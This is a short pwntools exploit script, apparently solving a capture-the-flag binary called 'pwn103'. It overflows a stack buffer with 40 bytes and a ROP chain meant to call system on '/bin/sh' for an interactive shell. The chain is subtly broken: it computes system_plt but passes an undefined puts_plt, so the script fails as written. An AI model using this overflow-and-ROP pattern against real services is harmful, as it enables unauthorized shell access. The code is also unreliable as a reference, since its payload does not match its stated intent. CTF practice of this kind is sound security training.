from pwn import *

IP = "10.10.219.109"

PORT = 9003

io = remote(IP, PORT)

elf = ELF("pwn103-1644300337872.pwn103", checksec=False)

print(io.recv().decode('latin-1'))

io.sendline(b"3")

print(io.recv().decode('latin-1'))

pop_rdi = 0x00000000004016db

ret = 0x0000000000401016

system_plt = elf.plt['system']

bin_sh = 0x40328f

# usually, a ret instruction is added in the ROP-chain for stack alignment
io.sendline(b'A'*40 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(puts_plt) + p64(elf.functions['general'].address))

io.interactive()
